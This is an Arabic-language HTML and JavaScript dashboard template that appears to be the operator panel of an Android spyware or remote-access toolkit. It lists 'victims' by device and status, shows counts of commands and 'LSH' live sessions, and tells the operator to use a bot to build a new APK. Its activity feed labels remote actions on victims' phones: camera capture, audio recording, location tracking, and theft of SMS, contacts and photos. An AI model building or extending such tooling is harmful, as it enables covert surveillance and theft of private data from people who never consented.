<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
<style>
  :root {
    --bg: #0b1120;
    --card: #1e293b;
    --border: #334155;
    --primary: #3b82f6;
    --success: #10b981;
    --danger: #ef4444;
    --warning: #f59e0b;
    --info: #06b6d4;
    --text: #e2e8f0;
    --muted: #94a3b8;
  }
  * { box-sizing: border-box; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: system-ui, -apple-system, sans-serif;
    margin: 0;
    min-height: 100vh;
    padding-bottom: 60px;
  }
  .navbar {
    background: rgba(15, 23, 42, 0.95);
    backdrop-filter: blur(10px);
    border-bottom: 1px solid var(--border);
    padding: 12px 20px;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .navbar-brand {
    color: var(--text) !important;
    font-weight: 700;
    font-size: 18px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .user-info {
    display: flex;
    align-items: center;
    gap: 12px;
    color: var(--muted);
    font-size: 13px;
  }
  .stat-card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 20px;
    transition: all 0.2s;
    position: relative;
    overflow: hidden;
  }
  .stat-card::before {
    content: '';
    position: absolute;
    top: 0; right: 0;
    width: 80px; height: 80px;
    background: radial-gradient(circle, rgba(59,130,246,0.15), transparent);
    transform: translate(30%, -30%);
  }
  .stat-card:hover {
    border-color: var(--primary);
    transform: translateY(-3px);
  }
  .stat-value { font-size: 32px; font-weight: 700; margin: 6px 0; }
  .stat-label { color: var(--muted); font-size: 13px; }
  .stat-icon {
    position: absolute;
    top: 18px;
    left: 18px;
    font-size: 22px;
    opacity: 0.5;
  }
  .victim-card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 16px;
    margin-bottom: 12px;
    cursor: pointer;
    transition: all 0.15s;
    display: block;
    text-decoration: none;
    color: inherit;
  }
  .victim-card:hover {
    border-color: var(--primary);
    background: #233047;
    color: inherit;
    transform: translateX(-4px);
  }
  .status-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    display: inline-block;
    margin-left: 8px;
    vertical-align: middle;
  }
  .status-online { background: var(--success); box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
  .status-idle { background: var(--warning); }
  .status-offline { background: #64748b; }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
  }
  .nav-tabs {
    border-bottom: 1px solid var(--border);
    margin-bottom: 24px;
  }
  .nav-tabs .nav-link {
    color: var(--muted);
    border: none;
    border-bottom: 2px solid transparent;
    padding: 12px 20px;
    font-weight: 500;
    background: transparent;
    cursor: pointer;
  }
  .nav-tabs .nav-link:hover { color: var(--text); border-color: transparent; }
  .nav-tabs .nav-link.active {
    color: var(--primary);
    background: transparent;
    border-bottom-color: var(--primary);
  }
  .activity-item {
    padding: 14px 16px;
    border-bottom: 1px solid var(--border);
    font-size: 14px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 16px;
  }
  .activity-item:last-child { border-bottom: none; }
  .activity-time { color: var(--muted); font-size: 12px; white-space: nowrap; }
  .empty-state {
    text-align: center;
    padding: 80px 20px;
    color: var(--muted);
  }
  .empty-state i {
    font-size: 72px;
    opacity: 0.2;
    margin-bottom: 20px;
    display: block;
  }
  .empty-state p { margin: 0 0 8px; font-size: 16px; }
  .empty-state small { opacity: 0.7; }
  .loading {
    display: inline-block;
    width: 20px; height: 20px;
    border: 2px solid rgba(59,130,246,0.3);
    border-top-color: var(--primary);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .badge-soft {
    padding: 4px 10px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 600;
  }
  .badge-online { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; }
  .badge-idle { background: rgba(245, 158, 11, 0.15); color: #fcd34d; }
  .badge-offline { background: rgba(100, 116, 139, 0.2); color: #94a3b8; }
  .search-box, .filter-select {
    background: var(--card) !important;
    border: 1px solid var(--border) !important;
    color: var(--text) !important;
    border-radius: 10px;
    padding: 10px 14px;
  }
  .search-box:focus, .filter-select:focus {
    background: var(--card) !important;
    border-color: var(--primary) !important;
    color: var(--text) !important;
    box-shadow: 0 0 0 0.2rem rgba(59,130,246,0.15);
  }
  .search-box::placeholder { color: var(--muted); }
  .filter-select option { background: var(--card); color: var(--text); }
</style>
</head>
<body>

<!-- Navbar -->
<nav class="navbar">
  <div class="d-flex justify-content-between align-items-center w-100">
    <a class="navbar-brand" href="/dashboard/">
      <i class="bi bi-shield-lock-fill" style="color:#3b82f6"></i>
      لوحة التحكم
    </a>
    <div class="user-info">
      <span class="d-none d-md-inline">
        <i class="bi bi-person-circle"></i>
        ID: {{ chat_id }}
      </span>
      <a href="/dashboard/logout" class="btn btn-sm btn-outline-danger">
        <i class="bi bi-box-arrow-left"></i>
        <span class="d-none d-md-inline">خروج</span>
      </a>
    </div>
  </div>
</nav>

<div class="container-fluid py-4" style="max-width:1400px">

  <!-- Stats -->
  <div class="row g-3 mb-4">
    <div class="col-6 col-lg-3">
      <div class="stat-card">
        <i class="bi bi-people-fill stat-icon text-primary"></i>
        <div class="stat-label">إجمالي الضحايا</div>
        <div class="stat-value" id="stat-total">—</div>
      </div>
    </div>
    <div class="col-6 col-lg-3">
      <div class="stat-card">
        <i class="bi bi-wifi stat-icon text-success"></i>
        <div class="stat-label">متصلين الآن</div>
        <div class="stat-value text-success" id="stat-online">—</div>
      </div>
    </div>
    <div class="col-6 col-lg-3">
      <div class="stat-card">
        <i class="bi bi-lightning-charge-fill stat-icon text-warning"></i>
        <div class="stat-label">أوامر اليوم</div>
        <div class="stat-value text-warning" id="stat-commands">—</div>
      </div>
    </div>
    <div class="col-6 col-lg-3">
      <div class="stat-card">
        <i class="bi bi-broadcast stat-icon text-info"></i>
        <div class="stat-label">جلسات LSH</div>
        <div class="stat-value text-info" id="stat-lsh">—</div>
      </div>
    </div>
  </div>

  <!-- Tabs -->
  <ul class="nav nav-tabs" id="mainTabs">
    <li class="nav-item">
      <a class="nav-link active" data-tab="victims">
        <i class="bi bi-phone"></i> الضحايا
      </a>
    </li>
    <li class="nav-item">
      <a class="nav-link" data-tab="lsh">
        <i class="bi bi-broadcast"></i> LSH
      </a>
    </li>
    <li class="nav-item">
      <a class="nav-link" data-tab="activity">
        <i class="bi bi-activity"></i> النشاط
      </a>
    </li>
  </ul>

  <!-- Tab: Victims -->
  <div id="tab-victims" class="tab-content">
    <div class="row g-3 mb-3">
      <div class="col-md-6">
        <input type="text" id="victim-search" class="form-control search-box"
               placeholder="🔍 ابحث بالاسم أو الموديل...">
      </div>
      <div class="col-md-3">
        <select id="victim-filter" class="form-select filter-select">
          <option value="all">الحالة: الكل</option>
          <option value="online">🟢 متصل</option>
          <option value="idle">🟡 خامل</option>
          <option value="offline">⚫ غير متصل</option>
        </select>
      </div>
      <div class="col-md-3">
        <button class="btn btn-outline-primary w-100" onclick="loadVictims()">
          <i class="bi bi-arrow-clockwise"></i> تحديث
        </button>
      </div>
    </div>
    <div id="victims-list">
      <div class="empty-state">
        <div class="loading"></div>
        <p class="mt-3">جاري التحميل...</p>
      </div>
    </div>
  </div>

  <!-- Tab: LSH -->
  <div id="tab-lsh" class="tab-content" style="display:none">
    <div id="lsh-list">
      <div class="empty-state">
        <div class="loading"></div>
        <p class="mt-3">جاري التحميل...</p>
      </div>
    </div>
  </div>

  <!-- Tab: Activity -->
  <div id="tab-activity" class="tab-content" style="display:none">
    <div class="stat-card">
      <h5 class="mb-3">
        <i class="bi bi-clock-history text-primary"></i>
        آخر الأحداث
      </h5>
      <div id="activity-feed">
        <div class="empty-state">
          <div class="loading"></div>
        </div>
      </div>
    </div>
  </div>

</div>

<script>
// ============================================================
// Utils
// ============================================================
function escapeHtml(s) {
  if (!s) return '';
  return String(s).replace(/[&<>"']/g, c => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  })[c]);
}

function timeAgo(ts) {
  if (!ts) return 'لم يتصل بعد';
  const diff = Date.now()/1000 - parseFloat(ts);
  if (diff < 60) return `قبل ${Math.floor(diff)}ث`;
  if (diff < 3600) return `قبل ${Math.floor(diff/60)}د`;
  if (diff < 86400) return `قبل ${Math.floor(diff/3600)}س`;
  return `قبل ${Math.floor(diff/86400)}ي`;
}

function getStatus(lastSeen) {
  if (!lastSeen) return 'offline';
  const diff = Date.now()/1000 - parseFloat(lastSeen);
  if (diff < 60) return 'online';
  if (diff < 3600) return 'idle';
  return 'offline';
}

// ============================================================
// Stats
// ============================================================
async function loadStats() {
  try {
    const r = await fetch('/dashboard/api/stats');
    if (!r.ok) throw new Error('stats failed');
    const d = await r.json();
    document.getElementById('stat-total').textContent = d.total || 0;
    document.getElementById('stat-online').textContent = d.online || 0;
    document.getElementById('stat-commands').textContent = d.commands_today || 0;
    document.getElementById('stat-lsh').textContent = d.lsh_sessions || 0;
  } catch(e) {
    console.error('stats error:', e);
  }
}

// ============================================================
// Victims
// ============================================================
let allVictims = [];

async function loadVictims() {
  try {
    const r = await fetch('/dashboard/api/victims');
    if (!r.ok) throw new Error('victims failed');
    allVictims = await r.json();
    renderVictims();
  } catch(e) {
    console.error('victims error:', e);
    document.getElementById('victims-list').innerHTML = `
      <div class="empty-state">
        <i class="bi bi-exclamation-triangle text-danger"></i>
        <p>فشل التحميل</p>
      </div>`;
  }
}

function renderVictims() {
  const container = document.getElementById('victims-list');
  const search = document.getElementById('victim-search').value.toLowerCase();
  const filter = document.getElementById('victim-filter').value;
  
  let filtered = allVictims.filter(v => {
    const status = getStatus(v.last_seen);
    if (filter !== 'all' && status !== filter) return false;
    
    if (search) {
      const haystack = `${v.name || ''} ${v.model || ''} ${v.brand || ''}`.toLowerCase();
      if (!haystack.includes(search)) return false;
    }
    return true;
  });
  
  if (!filtered.length) {
    container.innerHTML = `
      <div class="empty-state">
        <i class="bi bi-inbox"></i>
        <p>لا يوجد ضحايا</p>
        <small>استخدم البوت لإنشاء APK جديد</small>
      </div>`;
    return;
  }
  
  container.innerHTML = filtered.map(v => {
    const status = getStatus(v.last_seen);
    const siteIcon = {
      'facebook': '📘', 'instagram': '📷', 'tiktok': '🎵',
      'whatsapp': '💬', 'general': '📱'
    }[v.site] || '📱';
    
    const badgeClass = {
      'online': 'badge-online',
      'idle': 'badge-idle',
      'offline': 'badge-offline'
    }[status];
    
    const statusLabel = {
      'online': 'متصل',
      'idle': 'خامل',
      'offline': 'غير متصل'
    }[status];
    
    return `
      <a href="/dashboard/victim/${v.victim_id}" class="victim-card">
        <div class="d-flex justify-content-between align-items-center">
          <div style="flex:1;min-width:0">
            <h6 class="mb-1 text-truncate">
              <span class="status-dot status-${status}"></span>
              ${escapeHtml(v.name || 'بدون اسم')}
            </h6>
            <div class="text-muted small">
              ${siteIcon} ${escapeHtml(v.brand || '')} ${escapeHtml(v.model || '')}
            </div>
            <div class="text-muted small mt-1">
              <i class="bi bi-clock"></i> ${timeAgo(v.last_seen)}
            </div>
          </div>
          <div class="text-end">
            <span class="badge-soft ${badgeClass}">${statusLabel}</span>
          </div>
        </div>
      </a>
    `;
  }).join('');
}

// ============================================================
// LSH Sessions
// ============================================================
async function loadLSH() {
  const c = document.getElementById('lsh-list');
  c.innerHTML = '<div class="empty-state"><div class="loading"></div></div>';
  
  try {
    const r = await fetch('/dashboard/api/lsh_sessions');
    const sessions = await r.json();
    
    if (!sessions.length) {
      c.innerHTML = `
        <div class="empty-state">
          <i class="bi bi-broadcast-pin"></i>
          <p>لا يوجد جلسات LSH</p>
          <small>استخدم البوت لإنشاء جلسة جديدة</small>
        </div>`;
      return;
    }
    
    c.innerHTML = sessions.map(s => `
      <a href="/dashboard/lsh/${s.session_id}" class="victim-card">
        <div class="d-flex justify-content-between align-items-center">
          <div>
            <h6 class="mb-1">
              <i class="bi bi-broadcast text-info"></i>
              ${s.session_id.substring(0, 16)}...
            </h6>
            <div class="text-muted small">
              ${s.is_active ? '🟢 نشط' : '⚫ غير نشط'}
              · إعادة اتصال: ${s.reconnect_count}
              · أوامر معلقة: ${s.pending_commands}
            </div>
          </div>
        </div>
      </a>
    `).join('');
  } catch(e) {
    c.innerHTML = '<div class="empty-state"><p>فشل التحميل</p></div>';
  }
}

// ============================================================
// Activity
// ============================================================
async function loadActivity() {
  const c = document.getElementById('activity-feed');
  try {
    const r = await fetch('/dashboard/api/activity');
    const events = await r.json();
    
    if (!events.length) {
      c.innerHTML = `
        <div class="empty-state">
          <i class="bi bi-inbox"></i>
          <p>لا يوجد نشاط بعد</p>
        </div>`;
      return;
    }
    
    const actionLabels = {
      'camera_front': '📷 كاميرا أمامية',
      'camera_back': '📸 كاميرا خلفية',
      'record_audio': '🎙️ تسجيل صوتي',
      'get_location': '📍 موقع',
      'get_sms': '📨 رسائل SMS',
      'get_contacts': '👥 جهات اتصال',
      'get_photos': '🖼️ صور',
      'get_apps': '📲 تطبيقات',
      'get_device_info': '📱 معلومات الجهاز',
      'snapshot': '📸 لقطة LSH',
      'audio': '🎙️ صوت LSH',
      'location': '📍 موقع LSH',
    };
    
    c.innerHTML = events.map(e => {
      let text = '';
      if (e.type === 'command') {
        const icon = actionLabels[e.action] || `⚡ ${e.action}`;
        text = `${icon} — <code>${e.victim_id ? e.victim_id.substring(0,8) : ''}</code>`;
      } else {
        text = e.text || e.type;
      }
      
      return `
        <div class="activity-item">
          <div>${text}</div>
          <div class="activity-time">${e.time_str || ''}</div>
        </div>
      `;
    }).join('');
  } catch(e) {
    c.innerHTML = '<div class="empty-state"><p>فشل التحميل</p></div>';
  }
}

// ============================================================
// Tabs
// ============================================================
document.querySelectorAll('.nav-link[data-tab]').forEach(el => {
  el.addEventListener('click', e => {
    e.preventDefault();
    
    document.querySelectorAll('.nav-link[data-tab]').forEach(x => x.classList.remove('active'));
    el.classList.add('active');
    
    document.querySelectorAll('.tab-content').forEach(x => x.style.display = 'none');
    const target = document.getElementById('tab-' + el.dataset.tab);
    if (target) target.style.display = 'block';
    
    if (el.dataset.tab === 'activity') loadActivity();
    if (el.dataset.tab === 'lsh') loadLSH();
  });
});

// ============================================================
// Filters
// ============================================================
document.getElementById('victim-search').addEventListener('input', renderVictims);
document.getElementById('victim-filter').addEventListener('change', renderVictims);

// ============================================================
// Auto Refresh
// ============================================================
loadStats();
loadVictims();

setInterval(loadStats, 10000);
setInterval(loadVictims, 15000);
</script>

</body>
  </html>
